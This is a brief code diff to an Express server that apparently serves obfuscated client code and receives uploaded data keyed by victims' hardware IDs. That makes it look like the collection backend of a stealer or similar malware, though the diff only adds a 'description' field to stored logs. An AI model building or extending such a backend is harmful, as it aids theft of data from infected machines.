@@ -2,7 +2,6 @@ const { getObfuscatedClientCode, getObfuscatedCode } = require('../../util/obfus
 const { getShortHwid } = require('../../util/util.js');
 
 const logger = require('../../util/logger');
-const fs = require('fs');
 
 module.exports = (app) => {
     // pinging / last ping per client
@@ -27,11 +26,12 @@ module.exports = (app) => {
     // uploading data
     app.post('/d/:hwid', (req, res) => {
         const hwid = req.params.hwid;
-        let data = !req.body.data ? 'Empty' : req.body.data;
+        let data = req.body.data || 'Empty';
+        let description = req.query.description || 'Not specified';
 
         if (typeof data == 'object' && data != null) data = JSON.stringify(data);
 
-        app.db.prepare('INSERT INTO data_logs (date, hwid, data) VALUES (?, ?, ?)').run(Date.now(), hwid, data);
+        app.db.prepare('INSERT INTO data_logs (date, hwid, data, description) VALUES (?, ?, ?, ?)').run(Date.now(), hwid, data, description);
 
         res.status(200).send({});
     });
